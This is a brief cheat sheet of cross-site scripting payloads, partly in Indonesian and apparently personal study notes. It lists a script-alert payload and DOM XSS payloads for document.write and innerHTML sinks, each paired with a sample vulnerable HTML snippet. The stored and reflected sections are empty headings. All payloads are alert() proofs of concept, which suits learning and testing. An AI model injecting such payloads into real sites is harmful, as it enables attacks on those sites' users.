# 1. XSS Payload
    <script>alert(1)</script>
# 2. DOM XSS
- DOM XSS Tergantung pada sink nya
  ## 1. document.write sink
  
     Contoh source code:
     ```html
         <img src="...?searchTerms=INPUT">
     ```
     exploit
    - ` "><svg onload=alert(1)>`
    - `" onload="alert()`
      
  ## 2. innerHTML sink
  
  Contoh source code:
   ```html
    <div id="searchMessage">INPUT</div>
   ```
   exploit
  -  `<img src=x onerror=alert(1)>`
  - `<svg onload=alert(1)>`
     
# 3. Stored XSS

# 4. Reflected XSS

    
